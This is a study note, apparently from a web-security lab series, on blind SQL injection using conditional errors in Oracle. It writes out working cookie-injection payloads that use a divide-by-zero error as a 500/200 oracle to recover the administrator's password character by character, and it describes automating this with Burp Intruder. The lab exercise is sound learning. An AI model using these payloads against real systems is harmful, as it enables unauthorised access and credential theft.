# Day 7 — Blind SQL injection (conditional errors)

Same goal as conditional responses — extract data with no visible query output — but
this time the page looks **identical** whether the injected query returns a row or not.
There is no "Welcome back" to watch. So the previous oracle does not exist here.

## The trick: make my own oracle with an error
If the page won't tell me true from false, I force it to. I inject a condition that
makes the database **throw an error** only when the condition is true:
- condition **true**  -> database error -> **HTTP 500**
- condition **false** -> no error -> **HTTP 200**

So the oracle becomes the status code: 500 = true, 200 = false.

The error is a conditional divide-by-zero wrapped in a CASE expression:

    CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE '' END

- If the condition is true, `1/0` runs and the query errors (500).
- If false, the `ELSE ''` branch runs and nothing breaks (200).

## This lab is Oracle, so the syntax is Oracle
(See the Day 4 Oracle vs non-Oracle translator.)
- Concatenation: `||`
- Every SELECT needs `FROM dual` (or a real table like `users`)
- `SUBSTR` not `SUBSTRING`
- `LENGTH()` for length
- Force an error with `TO_CHAR(1/0)`

## Step 1 — confirm injection and build the oracle
Injected after the TrackingId cookie value:

    -- valid -> 200 (proves it reaches the DB, Oracle)
    ' || (SELECT '' FROM dual) || '
    -- invalid table -> error (confirms Oracle + injectable)
    ' || (SELECT '' FROM not_a_real_table) || '

    -- the oracle
    ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '   -> 500 (true)
    ' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '   -> 200 (false)

## Step 2-4 — same as conditional responses, oracle = 500
- **Confirm admin:** put the CASE in a `SELECT ... FROM users WHERE username='administrator'`.
  A 500 means the row exists and the CASE fired.
- **Length:**

      ' || (SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END
            FROM users WHERE username='administrator') || '

  Increase N until it flips from 500 to 200. (20 characters.)
- **Extract each character** (Oracle `SUBSTR`):

      ' || (SELECT CASE WHEN SUBSTR(password,<pos>,1)='<char>' THEN TO_CHAR(1/0) ELSE '' END
            FROM users WHERE username='administrator') || '

  A 500 means that character is correct for that position.

**With Burp Intruder:** same cluster bomb as before (position 1-20 x character a-z0-9),
but grep/sort on **status code 500** instead of a body string. As with any blind
extraction, in practice this is scripted rather than clicked.

## Error-based vs conditional-responses
The only real difference is the oracle:
- conditional responses: a visible content difference ("Welcome back").
- conditional errors: **I create** the difference by conditionally crashing the query.

Everything else (confirm, length, char-by-char) is identical.

## Key takeaway
If the page gives you no true/false signal, make one: a conditional error turns an
invisible query into a 500-vs-200 oracle. Then it's the same character-by-character
extraction as any blind SQLi.
